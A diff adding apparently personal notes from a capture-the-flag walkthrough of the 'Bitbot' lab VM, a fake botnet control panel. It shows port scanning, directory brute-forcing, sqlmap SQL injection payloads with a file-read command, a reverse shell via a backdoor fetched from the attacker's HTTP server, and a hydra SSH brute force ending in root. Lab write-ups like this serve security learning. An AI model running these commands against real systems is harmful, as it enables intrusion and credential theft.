@@ -1,0 +1,185 @@
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-08-18 16:16 EDT
+Nmap scan report for 192.168.56.101
+Host is up (0.0010s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+111/tcp open  rpcbind
+MAC Address: 08:00:27:BC:C2:B3 (Cadmus Computer Systems)
+
+Nmap done: 1 IP address (1 host up) scanned in 16.97 seconds
+
+http://192.168.56.101
+
+says to find it at /bot/bot.py. 
+access denied. 
+
+no robots.txt
+
+brute? 
+
+Sassinak:wfuzz warrenkopp$ ./wfuzz.py -w ../seclists/Discovery/Web_Content/Common_PHP_Filenames.txt --hc 404 http://192.168.56.101/FUZZ > today.txt
+Sassinak:wfuzz warrenkopp$ cat today.txt 
+********************************************************
+* Wfuzz 2.1.3 - The Web Bruteforcer                      *
+********************************************************
+
+Target: http://192.168.56.101/FUZZ
+Total requests: 5172
+
+==================================================================
+ID	Response   Lines      Word         Chars          Request    
+==================================================================
+
+00000:  C=200      0 L	       5 W	     52 Ch	  "index.php"
+00012:  C=200      5 L	       4 W	     37 Ch	  "footer.php"
+00020:  C=200      0 L	       0 W	      0 Ch	  "config.php"
+00021:  C=200     53 L	     166 W	   1810 Ch	  "header.php"
+00030:  C=200     57 L	     167 W	   1769 Ch	  "admin.php"
+00037:  C=200      0 L	       8 W	     51 Ch	  "functions.php"
+00115:  C=200     57 L	     167 W	   1769 Ch	  "commands.php"
+00190:  C=200      0 L	       0 W	      0 Ch	  "submit.php"
+01058:  C=200     57 L	     167 W	   1769 Ch	  "stats.php"
+04613:  C=200     57 L	     167 W	   1769 Ch	  "bots.php"
+
+Total time: 8.168884
+Processed Requests: 5172
+Filtered Requests: 5162
+Requests/sec.: 633.1341
+
+ooo admin
+
+start burp - at very least secondary recording of what i find. 
+
+$ ./sqlmap.py -u "http://192.168.56.101/admin.php" --data="login=1&username=&password="
+nothing really at default level
+
+author gives a clue that this is a default request for the gate2.php file. (which i'm only 
+aware of b/c of his blog)
+
+http://evilc2.openbwall.com/panel/gate2.php?windows=Windows&country=US&hwid=101&connection=0&version=100&btc=all&sysinfo=Some+Info
+./sqlmap.py -u "http://192.168.56.101/gate2.php?windows=Windows&country=US&hwid=101&connection=0&version=100&btc=all&sysinfo=Some+Info" 
+
+sqlmap identified the following injection point(s) with a total of 19156 HTTP(s) requests:
+---
+Parameter: hwid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: windows=Windows&country=US&hwid=101' AND 4125=4125 AND 'izYQ'='izYQ&connection=0&version=100&btc=all&sysinfo=Some Info
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: windows=Windows&country=US&hwid=101' AND SLEEP(5) AND 'nBhj'='nBhj&connection=0&version=100&btc=all&sysinfo=Some Info
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 12 columns
+    Payload: windows=Windows&country=US&hwid=-2982' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b7a6271,0x546d706e594d6c6e44686242444d616d624c4a636a6d4b68555641675276505a7a5243684b70795a,0x71626a7a71),NULL,NULL,NULL-- VFky&connection=0&version=100&btc=all&sysinfo=Some Info
+---
+[15:20:36] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 7.0 (wheezy)
+web application technology: Apache 2.2.22, PHP 5.4.4
+back-end DBMS: MySQL >= 5.0.12
+[15:20:36] [INFO] fetched data logged to text files under '/Users/warrenkopp/.sqlmap/output/192.168.56.101'
+
+
+./sqlmap.py -u "http://192.168.56.101/gate2.php?windows=Windows&country=US&hwid=101&connection=0&version=100&btc=all&sysinfo=Some+Info" --method=GET -p hwid --dbms=mysql --current-user --current-db
+[15:35:21] [INFO] fetching current user
+current user:    'root@localhost'
+[15:35:21] [INFO] fetching current database
+current database:    'bitbot'
+
+./sqlmap.py -u "http://192.168.56.101/gate2.php?windows=Windows&country=US&hwid=101&connection=0&version=100&btc=all&sysinfo=Some+Info" --method=GET -p hwid --dbms=mysql --users --tables
+Database: bitbot
+[2 tables]
++----------------------------------------------+
+| bots                                         |
+| mining_configs                               |
++----------------------------------------------+
+
+now have complete db access as whatever the app is running under. dumping users, passwords, privileges. 
+
+need valid login to the c2. sqlmap has a read local file option?!
+
+$ ./sqlmap.py -u "http://192.168.56.101/gate2.php?windows=Windows&country=US&hwid=101&connection=0&version=100&btc=all&sysinfo=Some+Info" --method=GET -p hwid --dbms=mysql --file-read=/var/www/admin.php
+
+[15:58:57] [INFO] fetching file: '/var/www/admin.php'
+do you want confirmation that the remote file '/var/www/admin.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] y
+[15:59:03] [INFO] the local file '/Users/warrenkopp/.sqlmap/output/192.168.56.101/files/_var_www_admin.php' and the remote file '/var/www/admin.php' have the same size (9406 B)
+files saved to [1]:
+[*] /Users/warrenkopp/.sqlmap/output/192.168.56.101/files/_var_www_admin.php (same file)
+
+[15:59:03] [INFO] fetched data logged to text files under '/Users/warrenkopp/.sqlmap/output/192.168.56.101'
+
+
+repeat for config.php
+
+<screenshot with login and password>
+<screenshot of logged in admin.php>
+
+next goal: interactive login
+successive goal: interactive root login
+
+interactive login successful with a python backdoor labelled .php. 
+setup a local http server with python on port 8000, then tell control panel to 
+hit that file. bot will execute, sending shell to waiting nc on attacker machine. 
+
+DOWN http://192.168.56.1:8000/test.php
+
+in turn gets us interactive shell as low privileged user. 
+<screenshot>
+
+poking around there's this in /home/botter: 
+
+$ cat gen.sh
+ifconfig eth0 | grep inet | grep -v inet6 | awk '{print $2substr(rand(),0,5);}' | awk '{print $0"\n"$0}' | passwd
+
+read config of eth0
+find the inet Line
+drop the ipv6 Info
+print the second field(ip4 address) + a random number between 0 and 1 + ...awk docs say 
+substr takes <string> <length> <position> to extract from a given string. however running 
+that a few dozen times shows me it's only incrementing the last two digits between 0-99	
+
+hijack barrabas' quicky python one-liner to dump a file full of these, 
+then use hydra to brute the ssh login. 
+
+...
+cept hydra needs a bunch of stuff that's not on os x by default. that'll probably get it's 
+own article at some point. 
+
+Sassinak:vm-notes warrenkopp$ hydra -l root -P hydrapw_bitbot.txt 192.168.56.101 ssh
+Hydra v8.4-dev (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2016-08-19 22:13:06
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 64 tasks, 100 login tries (l:1/p:100), ~0 tries per task
+[DATA] attacking service ssh on port 22
+[22][ssh] host: 192.168.56.101   login: root   password: addr:192.168.56.1010.94
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2016-08-19 22:13:35
+
+and in as root. one more down!
+
+$ ssh root@192.168.56.101
+The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
+ECDSA key fingerprint is SHA256:U0TA71wwznA4wcNoONzsbb17fXasZmz3IrUqiApb2Oo.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.56.101' (ECDSA) to the list of known hosts.
+root@192.168.56.101's password: 
+Linux Bitbot 3.2.0-4-686-pae #1 SMP Debian 3.2.46-1 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@Bitbot:~# whoami
+root
+root@Bitbot:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+## footer
+https://blog.cylance.com/a-study-in-bots-bitbot
+http://staringintodevnull.blogspot.nl/2013/11/flipping-bitbot-write-up.html
